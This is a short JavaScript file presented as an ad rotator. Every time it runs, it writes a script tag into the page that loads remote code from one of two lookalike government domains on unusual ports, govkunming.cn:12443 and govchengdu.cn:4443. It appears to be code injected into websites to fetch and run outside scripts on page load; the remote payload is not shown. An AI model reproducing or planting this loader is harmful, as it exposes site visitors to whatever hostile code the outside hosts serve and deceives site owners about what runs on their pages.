var randoms = {
	ads_codes: ['<script src="https://www.govkunming.cn:12443/ty/CD57FF04-55AF-13450-33-B5BE5C3DE0C8.alpha"><'+'/script>','<script src="https://www.govchengdu.cn:4443/ty/x-3664-33.js"><'+'/script>'],
	ads_weight: [10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();